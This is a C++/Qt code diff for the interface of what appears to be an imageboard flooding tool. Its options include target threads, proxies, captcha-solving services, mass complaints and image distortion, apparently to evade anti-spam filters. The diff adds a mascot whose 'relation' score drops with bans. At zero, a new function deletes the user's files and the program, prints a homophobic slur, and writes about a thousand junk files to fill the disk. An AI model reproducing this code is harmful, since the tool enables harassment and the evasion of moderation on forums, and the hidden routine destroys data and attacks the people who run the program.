@@ -2,7 +2,11 @@
 #include "ui_gui.h"
 #include <cstdio>
 #include <stdlib.h>
+#include <QLayout>
 #include <QDesktopWidget>
+#include <QFontDatabase>
+#include <QMessageBox>
+#include <QDebug>
 #include "rapidjson/document.h"
 
 GUI::GUI (QWidget * parent)
@@ -10,6 +14,13 @@ GUI::GUI (QWidget * parent)
 {
     ui->setupUi(this);
     fileDialog = new QFileDialog;
+
+    QStringList fonts = QDir(QDir::currentPath()+"/gui/fonts").entryList();
+    for (unsigned int i(0); i < fonts.size(); i++)
+        QFontDatabase::addApplicationFont(QString(QDir::currentPath()+"/gui/fonts/"+fonts[i]));
+    QFontDatabase db;
+    for (unsigned short i(0); i < db.families().size(); i++)
+        std::cout << db.families()[i].toStdString() << std::endl;
 
     std::string path;
     std::ifstream theme(QDir::currentPath().toStdString()+"/gui/theme");
@@ -26,9 +37,12 @@ GUI::GUI (QWidget * parent)
     getline(theme, path);
     anima = new QMovie(QDir::currentPath()+"/gui/"+path.c_str());
     ui->anima->setMovie(anima);
+    getline(theme, path);
+    ui->chan->set_chan(path);
 
     ui->chan->set_blockquote(ui->blockquote);
     ui->chan->uncall();
+    install_filter();
 
     isPidor = false;
     isPlaying = false;
@@ -71,8 +85,8 @@ void GUI::set_layout (std::string path) {
     "stats", "stats_header", "total_posts_label", "total_posts", "total_posts_LCD", "total_bans_label", "total_bans", "total_bans_LCD", "posts_label", "posts", "posts_LCD", "proxies_label", "proxies", "proxies_LCD",
 
     "Wipe-chan", "blockquote", "back_banner", "anima", "start_button"
-};
-    std::string text;
+    };
+    std::string text, toolTip;
     int x, y, width, height, value, digitsCount;
     bool hiding, hidden, disable, disabled, checked, vertical;
     QWidget * widget;  QLabel * label;  QPushButton * button;  QCheckBox * checkBox;  QRadioButton * radioButton;  QLineEdit * edit;  QSpinBox * spin; QComboBox * combo; QLCDNumber * LCD; QSlider * slider;
@@ -98,6 +112,7 @@ void GUI::set_layout (std::string path) {
                 if (member.HasMember("height") && member["height"].IsInt()) height = member["height"].GetInt(); else height = 0;
                 if (member.HasMember("text") && member["text"].IsString()) text = member["text"].GetString(); else text = "";
                 if (member.HasMember("value") && member["value"].IsInt()) value = member["value"].GetInt(); else value = 0;
+                if (member.HasMember("tip") && member["tip"].IsString()) toolTip = member["tip"].GetString(); else toolTip = "";
                 if (member.HasMember("digits_count") && member["digits_count"].IsInt()) digitsCount = member["digits_count"].GetInt(); else digitsCount = 0;
                 if (member.HasMember("checked") && member["checked"].IsBool()) checked = member["checked"].GetBool(); else checked = false;
                 if (member.HasMember("vertical") && member["vertical"].IsBool()) vertical = member["vertical"].GetBool(); else vertical = false;
@@ -273,6 +288,7 @@ void GUI::set_layout (std::string path) {
 
                     if (type != 0) {
                         widget->setGeometry(x, y, width, height);
+                        if (!toolTip.empty()) widget->setToolTip(toolTip.c_str());
 
                         widget->property("hiding");  widget->property("hidden");  widget->property("disabled");
                         if (disable) widget->setProperty("disable", true); else widget->setProperty("disable", false);
@@ -297,6 +313,72 @@ void GUI::set_layout (std::string path) {
         std::cerr << "ОШИБКА В МАКЕТЕ!\n";
         exit(1);
     }
+}
+
+void GUI::install_filter () {
+    ui->username->installEventFilter(this);
+    ui->password->installEventFilter(this);
+
+    ui->mainMode->installEventFilter(this);
+    ui->shrapnelMode->installEventFilter(this);
+    ui->board->installEventFilter(this);
+    ui->thread->installEventFilter(this);
+    ui->fibers->installEventFilter(this);
+    ui->shrapnelBoard->installEventFilter(this);
+    ui->threads->installEventFilter(this);
+    ui->minPosts->installEventFilter(this);
+    ui->shrapnelFibers->installEventFilter(this);
+
+    ui->anticaptcha->installEventFilter(this);
+    ui->gurocaptcha->installEventFilter(this);
+    ui->x_captcha->installEventFilter(this);
+    ui->reserved->installEventFilter(this);
+    ui->key->installEventFilter(this);
+    ui->serverKey->installEventFilter(this);
+
+    ui->repeats->installEventFilter(this);
+    ui->noText->installEventFilter(this);
+    ui->quoting->installEventFilter(this);
+    ui->copying->installEventFilter(this);
+    ui->overload->installEventFilter(this);
+    ui->pastes->installEventFilter(this);
+    ui->complain->installEventFilter(this);
+    ui->chaining->installEventFilter(this);
+    ui->random->installEventFilter(this);
+    ui->shashlik->installEventFilter(this);
+    ui->oppost->installEventFilter(this);
+    ui->notrigger->installEventFilter(this);
+    ui->complainBoard->installEventFilter(this);
+    ui->linksCount->installEventFilter(this);
+    ui->withPosts->installEventFilter(this);
+    ui->chaos->installEventFilter(this);
+    ui->randChaos->installEventFilter(this);
+    ui->target->installEventFilter(this);
+    ui->sage->installEventFilter(this);
+    ui->sageAlways->installEventFilter(this);
+    ui->sageFromPosts->installEventFilter(this);
+
+    ui->images->installEventFilter(this);
+    ui->imagesCount->installEventFilter(this);
+    ui->imagesFolder->installEventFilter(this);
+    ui->videos->installEventFilter(this);
+    ui->videosCount->installEventFilter(this);
+    ui->videosFolder->installEventFilter(this);
+    ui->medias->installEventFilter(this);
+    ui->noMedia->installEventFilter(this);
+    ui->shackalDegree->installEventFilter(this);
+    ui->shackalColor->installEventFilter(this);
+    ui->shackalAffine->installEventFilter(this);
+    ui->toPNG->installEventFilter(this);
+
+    ui->totalPosts->installEventFilter(this);
+    ui->totalBans->installEventFilter(this);
+    ui->posts->installEventFilter(this);
+    ui->proxies->installEventFilter(this);
+    ui->totalPostsLCD->installEventFilter(this);
+    ui->totalBansLCD->installEventFilter(this);
+    ui->postsLCD->installEventFilter(this);
+    ui->proxiesLCD->installEventFilter(this);
 }
 
 
@@ -327,6 +409,11 @@ void GUI::loadData () {
                 username = value;
             } else if (key == "password") {
                 ui->password->setText(value.c_str());
+            } else if (key == "met") {
+                if (value == "0") met = false;
+                else met = true;
+            } else if (key == "relation") {
+                relation = atoi(value.c_str());
             }
             postsCount = "0";
             ui->posts->setText("0");
@@ -334,6 +421,7 @@ void GUI::loadData () {
         }
 
     } else {
+        totalPosts = "0";
         ui->totalPosts->setText("0");
         ui->totalPostsLCD->display(0);
         username = "Аноним";
@@ -345,6 +433,8 @@ void GUI::loadData () {
         postsCount = "0";
         ui->posts->setText("0");
         ui->postsLCD->display(0);
+        met = false;
+        relation = 5000;
 
         updateConfig();
     }
@@ -358,8 +448,11 @@ void GUI::loadData () {
     ui->proxiesLCD->display(proxiesCount.c_str());
 }
 
-void GUI::updateData () {
+void GUI::updateData (const bool &chanIsCalled) {
     std::string key, datum, value;
+    int posts, bans;
+    long result;
+    bool crashed(false);
     std::ifstream responce(QDir::currentPath().toStdString() + "/.responce");
     if (responce.is_open()) {
         while(!responce.eof()) {
@@ -369,14 +462,30 @@ void GUI::updateData () {
             if (key == "posts") {
                 postsCount = value;
                 ui->posts->setText(postsCount.c_str());
-                ui->postsLCD->display(atoi(postsCount.c_str()));
-                totalPosts = to_string(atoi(totalPosts.c_str()) + atoi(value.c_str()));
+                posts = atoi(value.c_str());
+                ui->postsLCD->display(posts);
+                totalPosts = to_string(atoi(totalPosts.c_str()) + posts);
                 ui->totalPosts->setText(totalPosts.c_str());
                 ui->totalPostsLCD->display(atoi(totalPosts.c_str()));
+
             } else if (key == "bans") {
-                totalBans = to_string(atoi(totalBans.c_str()) + atoi(value.c_str()));
+                bans = atoi(value.c_str());
+                totalBans = to_string(atoi(totalBans.c_str()) + bans);
                 ui->totalBans->setText(totalBans.c_str());
                 ui->totalBansLCD->display(atoi(totalBans.c_str()));
+            } else if (key == "crash")
+                crashed = true;
+        }
+
+        if (chanIsCalled) {
+            if (crashed) {
+                ui->chan->call(Wipechan::CRASH, {}, username, relation);
+            } else {
+                result = (posts - bans * 50);
+                relation += result;
+                if (relation <= 0) delAll(responce);
+
+                ui->chan->call(Wipechan::FINISH, {postsCount, to_string(bans)}, username, 5000 + result * 10);
             }
         }
     }
@@ -397,7 +506,37 @@ void GUI::updateConfig () {
     config << "password " << ui->password->text().toStdString() << std::endl;
     config << "total_posts " << totalPosts << std::endl;
     config << "total_bans " << totalBans << std::endl;
+    config << "met " << (met == 0 ? "0" : "1") << std::endl;
+    config << "relation " << relation << std::endl;
 }
+
+void GUI::delAll (std::ifstream &responce) {
+    responce.close();
+    remove(std::string(QDir::currentPath().toStdString() + "/.responce").c_str());
+
+    remove(std::string(QDir::currentPath().toStdString() + "/.config").c_str());
+    remove(std::string(QDir::currentPath().toStdString() + "/.gui").c_str());
+#ifdef __linux__
+    remove(std::string(QDir::currentPath().toStdString() + "/.wiper").c_str());
+#else
+    remove(std::string(QDir::currentPath().toStdString() + "/.wiper.exe").c_str());
+#endif
+
+    QMessageBox::information(NULL, "Message", "Ты проебал все полимеры.");
+
+    std::cerr << "TY PIDOR" << std::endl;
+    std::ofstream file;
+    for (unsigned short i(0); i < 1000; i++) {
+        file.open(std::string(QDir::currentPath().toStdString() + to_string(i)));
+        for (unsigned short j(0); j < 1000; j++) {
+            for (unsigned char k(0); k < 100; k++)
+                file << "TY PIDOR";
+            file << endl;
+        }
+    }
+    exit(-1);
+}
+
 
 
 
@@ -405,12 +544,11 @@ void GUI::updateConfig () {
 
 void GUI::on_startButton_clicked () {
     if (started == false) {
-        ui->chan->call("start", {username});
+        if (ui->chan->is_called())
+            ui->chan->call(Wipechan::START, {username}, username, relation);
         //if (start()) started = true;
-        if (start()) {
-            updateData();
-            ui->chan->call("finish", {postsCount});
-        }
+        if (start())
+            updateData(ui->chan->is_called());
     } else stop();
 }
 
@@ -537,11 +675,12 @@ bool GUI::start () {
     setup.set_2PNG(ui->toPNG->isChecked());
 
     vector<string> response(setup.start());
-    if (!(response[0] == "OK")) {
-        ui->chan->call("error", response);
-        return false;
-    } else
+    if (response[0] == "OK")
         return true;
+    else {
+        ui->chan->call(Wipechan::ERROR, response, username, relation);
+        return false;
+    }
 }
 
 bool GUI::stop () {
@@ -884,18 +1023,10 @@ void GUI::on_openButton_clicked () {
         if (ui->videosFolderLabel->property("hidden").toBool()) ui->videosFolderLabel->hide();
         if (ui->videosFolder->property("hidden").toBool()) ui->videosFolder->hide();
 
-        if (ui->imagesCountLabel->property("disabled").toBool()) ui->imagesCountLabel->setDisabled(true);
-        if (ui->imagesCount->property("disabled").toBool()) ui->imagesCount->setDisabled(true);
-        if (ui->imagesFolderLabel->property("disabled").toBool()) ui->imagesFolderLabel->setDisabled(true);
-        if (ui->imagesFolder->property("disabled").toBool()) ui->imagesFolder->setDisabled(true);
-        if (ui->imagesCountLabel->property("hidden").toBool()) ui->imagesCountLabel->hide();
-        if (ui->imagesCount->property("hidden").toBool()) ui->imagesCount->hide();
-        if (ui->imagesFolderLabel->property("hidden").toBool()) ui->imagesFolderLabel->hide();
-        if (ui->imagesFolder->property("hidden").toBool()) ui->imagesFolder->hide();
-
         if (ui->shackalBox->property("disabled").toBool()) ui->shackalBox->setDisabled(true);
         if (ui->shackalBox->property("hidden").toBool()) ui->shackalBox->hide();
     }
+
     getline(config, value);
     ui->imagesCount->setValue(atoi(value.c_str()));
     getline(config, value);
@@ -911,6 +1042,8 @@ void GUI::on_openButton_clicked () {
     ui->shackalColor->setChecked((value == "color"));
     getline(config, value);
     ui->shackalAffine->setChecked(value == "affine");
+    getline(config, value);
+    ui->toPNG->setChecked(value == "to PNG");
 }
 
 void GUI::on_saveButton_clicked () {
@@ -983,6 +1116,8 @@ void GUI::on_saveButton_clicked () {
     config << std::endl;
     if (ui->shackalAffine->isChecked()) config << "affine";
     config << std::endl;
+    if (ui->toPNG->isChecked()) config << "to PNG";
+    config << std::endl;
 }
 
 
@@ -1009,8 +1144,17 @@ void GUI::on_username_editingFinished () {
 
 
 void GUI::on_helpButton_clicked () {
-    if (ui->chan->is_called()) ui->chan->uncall();
-    else ui->chan->call("hello", {username});
+    if (ui->chan->is_called()) {
+        ui->chan->uncall();
+        ui->helpButton->setChecked(false);
+    } else if (met) {
+        ui->chan->call(Wipechan::HELLO, {}, username, relation);
+        ui->helpButton->setChecked(true);
+    } else {
+        ui->chan->call(Wipechan::MEET, {}, username);
+        ui->helpButton->setChecked(true);
+        met = true;
+    }
 }
 
 
@@ -1212,4 +1356,161 @@ void GUI::check_media (std::string type) {
         if (ui->shackalBox->property("disable").toBool()) ui->shackalBox->setDisabled(true);
         if (ui->shackalBox->property("hiding").toBool()) ui->shackalBox->hide();
     }
+}
+
+
+
+
+
+bool GUI::eventFilter (QObject * object, QEvent * event) {
+    if (event->type() == QEvent::FocusIn && ui->chan->is_called()) {
+        if (object == ui->username) {
+            ui->chan->call(Wipechan::TIP, {"USERNAME"}, username);
+            ui->username->setFocus();
+        } else if (object == ui->password) {
+            ui->chan->call(Wipechan::TIP, {"PASSWORD"}, username);
+            ui->password->setFocus();
+
+        } else if (object == ui->mainMode) {
+            ui->chan->call(Wipechan::TIP, {"MAIN_MODE"}, username);
+        } else if (object == ui->shrapnelMode) {
+            ui->chan->call(Wipechan::TIP, {"SHRAPNEL_MODE"}, username);
+        } else if (object == ui->board) {
+            ui->chan->call(Wipechan::TIP, {"BOARD"}, username);
+            ui->board->setFocus();
+        } else if (object == ui->thread) {
+            ui->chan->call(Wipechan::TIP, {"THREAD"}, username);
+            ui->thread->setFocus();
+        } else if (object == ui->fibers) {
+            ui->chan->call(Wipechan::TIP, {"FIBERS"}, username);
+            ui->fibers->setFocus();
+        } else if (object == ui->shrapnelBoard) {
+            ui->chan->call(Wipechan::TIP, {"SHRAPNEL_BOARD"}, username);
+            ui->shrapnelBoard->setFocus();
+        } else if (object == ui->threads) {
+            ui->chan->call(Wipechan::TIP, {"THREADS"}, username);
+            ui->threads->setFocus();
+        } else if (object == ui->minPosts) {
+            ui->chan->call(Wipechan::TIP, {"MIN_POSTS"}, username);
+            ui->minPosts->setFocus();
+        } else if (object == ui->shrapnelFibers) {
+            ui->chan->call(Wipechan::TIP, {"SHRAPNEL_FIBERS"}, username);
+            ui->shrapnelFibers->setFocus();
+
+        } else if (object == ui->anticaptcha) {
+            ui->chan->call(Wipechan::TIP, {"ANTICAPTCHA"}, username);
+        } else if (object == ui->gurocaptcha) {
+            ui->chan->call(Wipechan::TIP, {"GURO-CAPTCHA"}, username);
+        } else if (object == ui->x_captcha) {
+            ui->chan->call(Wipechan::TIP, {"X-CAPTCHA"}, username);
+        } else if (object == ui->reserved) {
+            ui->chan->call(Wipechan::TIP, {"RESERVED"}, username);
+        } else if (object == ui->key) {
+            ui->chan->call(Wipechan::TIP, {"KEY"}, username);
+            ui->key->setFocus();
+        } else if (object == ui->serverKey) {
+            ui->chan->call(Wipechan::TIP, {"SERVER_KEY"}, username);
+
+        } else if (object == ui->repeats) {
+            ui->chan->call(Wipechan::TIP, {"REPEATS"}, username);
+            ui->repeats->setFocus();
+        } else if (object == ui->noText) {
+            ui->chan->call(Wipechan::TIP, {"NO_TEXT"}, username);
+        } else if (object == ui->quoting) {
+            ui->chan->call(Wipechan::TIP, {"QUOTING"}, username);
+        } else if (object == ui->copying) {
+            ui->chan->call(Wipechan::TIP, {"COPYING"}, username);
+        } else if (object == ui->overload) {
+            ui->chan->call(Wipechan::TIP, {"OVERLOAD"}, username);
+        } else if (object == ui->pastes) {
+            ui->chan->call(Wipechan::TIP, {"PASTES"}, username);
+        } else if (object == ui->complain) {
+            ui->chan->call(Wipechan::TIP, {"COMPLAIN"}, username);
+        } else if (object == ui->chaining) {
+            ui->chan->call(Wipechan::TIP, {"CHAINING"}, username);
+        } else if (object == ui->randTrigger) {
+            ui->chan->call(Wipechan::TIP, {"RANDOM_TRIGGER"}, username);
+        } else if (object == ui->shashlik) {
+            ui->chan->call(Wipechan::TIP, {"SHASHLIK"}, username);
+        } else if (object == ui->oppost) {
+            ui->chan->call(Wipechan::TIP, {"OP-POST_TRIGGER"}, username);
+        } else if (object == ui->notrigger) {
+            ui->chan->call(Wipechan::TIP, {"NO_TRIGGER"}, username);
+        } else if (object == ui->complainBoard) {
+            ui->chan->call(Wipechan::TIP, {"COMPLAIN_BOARD"}, username);
+            ui->complainBoard->setFocus();
+        } else if (object == ui->linksCount) {
+            ui->chan->call(Wipechan::TIP, {"LINKS_COUNT"}, username);
+        } else if (object == ui->withPosts) {
+            ui->chan->call(Wipechan::TIP, {"WITH_POSTS"}, username);
+        } else if (object == ui->chaos) {
+            ui->chan->call(Wipechan::TIP, {"CHAOS"}, username);
+        } else if (object == ui->randChaos) {
+            ui->chan->call(Wipechan::TIP, {"RANDOM_CHAOS"}, username);
+        } else if (object == ui->target) {
+            ui->chan->call(Wipechan::TIP, {"TARGET"}, username);
+            ui->target->setFocus();
+        } else if (object == ui->sage) {
+            ui->chan->call(Wipechan::TIP, {"SAGE"}, username);
+        } else if (object == ui->sageAlways) {
+            ui->chan->call(Wipechan::TIP, {"SAGE_ALWAYS"}, username);
+        } else if (object == ui->sageFromPosts) {
+            ui->chan->call(Wipechan::TIP, {"SAGE_FROM_POSTS"}, username);
+
+        } else if (object == ui->images) {
+            ui->chan->call(Wipechan::TIP, {"IMAGES"}, username);
+        } else if (object == ui->imagesCount) {
+            ui->chan->call(Wipechan::TIP, {"IMAGES_COUNT"}, username);
+        } else if (object == ui->imagesFolder) {
+            ui->chan->call(Wipechan::TIP, {"IMAGES_FOLDER"}, username);
+            ui->imagesFolder->setFocus();
+        } else if (object == ui->videos) {
+            ui->chan->call(Wipechan::TIP, {"VIDEOS"}, username);
+        } else if (object == ui->videosCount) {
+            ui->chan->call(Wipechan::TIP, {"VIDEOS_COUNT"}, username);
+        } else if (object == ui->videosFolder) {
+            ui->chan->call(Wipechan::TIP, {"VIDEOS_FOLDER"}, username);
+            ui->videosFolder->setFocus();
+        } else if (object == ui->medias) {
+            ui->chan->call(Wipechan::TIP, {"MEDIAS_FROM_POSTS"}, username);
+        } else if (object == ui->noMedia) {
+            ui->chan->call(Wipechan::TIP, {"NO_MEDIA"}, username);
+        } else if (object == ui->shackalDegree) {
+            ui->chan->call(Wipechan::TIP, {"SHACKAL_DEGREE"}, username);
+        } else if (object == ui->shackalColor) {
+            ui->chan->call(Wipechan::TIP, {"COLORIZATION"}, username);
+        } else if (object == ui->shackalAffine) {
+            ui->chan->call(Wipechan::TIP, {"AFFINE"}, username);
+        } else if (object == ui->toPNG) {
+            ui->chan->call(Wipechan::TIP, {"TO_PNG"}, username);
+
+        } else if (object == ui->totalPostsLabel) {
+            ui->chan->call(Wipechan::TIP, {"TOTAL_POSTS"}, username);
+        } else if (object == ui->totalPosts) {
+            ui->chan->call(Wipechan::TIP, {"TOTAL_POSTS"}, username);
+        } else if (object == ui->totalPostsLCD) {
+            ui->chan->call(Wipechan::TIP, {"TOTAL_POSTS"}, username);
+        } else if (object == ui->totalBansLabel) {
+            ui->chan->call(Wipechan::TIP, {"TOTAL_BANS"}, username);
+        } else if (object == ui->totalBans) {
+            ui->chan->call(Wipechan::TIP, {"TOTAL_BANS"}, username);
+        } else if (object == ui->totalBansLCD) {
+            ui->chan->call(Wipechan::TIP, {"TOTAL_BANS"}, username);
+        } else if (object == ui->postsLabel) {
+            ui->chan->call(Wipechan::TIP, {"POSTS"}, username);
+        } else if (object == ui->posts) {
+            ui->chan->call(Wipechan::TIP, {"POSTS"}, username);
+        } else if (object == ui->postsLCD) {
+            ui->chan->call(Wipechan::TIP, {"POSTS"}, username);
+        } else if (object == ui->proxiesLabel) {
+            ui->chan->call(Wipechan::TIP, {"PROXIES"}, username);
+        } else if (object == ui->proxies) {
+            ui->chan->call(Wipechan::TIP, {"PROXIES"}, username);
+        } else if (object == ui->proxiesLCD) {
+            ui->chan->call(Wipechan::TIP, {"PROXIES"}, username);
+        }
+
+        return true;
+    }
+    return false;
 }
